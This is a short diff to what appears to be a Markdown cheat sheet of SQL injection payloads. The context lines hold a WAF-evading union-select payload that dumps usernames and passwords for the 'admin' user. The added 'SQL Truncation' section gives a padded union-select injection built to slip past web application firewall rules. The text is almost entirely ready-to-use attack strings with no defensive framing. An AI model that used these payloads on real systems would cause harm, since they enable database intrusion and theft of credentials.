@@ -29,3 +29,9 @@ Enumerate column names of a database
 Dump data from a database
 
     '/**/uNion/**/sElect/**/username,password,3,4/**/FROM/**/users/**/WHERE/**/username='admin';--
+
+### 3) SQL Truncation
+
+The number of pad characters depends on the WAF rule set
+
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' union select 1,2,3,4,5--
